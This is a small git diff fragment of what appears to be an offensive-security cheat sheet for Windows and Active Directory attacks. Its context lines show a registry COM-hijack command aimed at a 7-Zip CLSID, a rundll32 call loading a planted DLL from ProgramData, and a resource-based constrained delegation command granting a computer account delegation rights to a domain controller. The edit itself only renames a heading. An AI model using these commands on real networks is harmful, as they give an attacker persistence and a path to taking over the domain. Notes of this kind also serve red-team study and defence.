@@ -204,7 +204,7 @@ reg add "HKLM\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\Inpr
 rundll32.exe C:\\programdata\\x.dll,DllRegisterServer
 ```
 
-## RBCD
+## RBCD mm.turnerrel
 
 ```bash
 Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
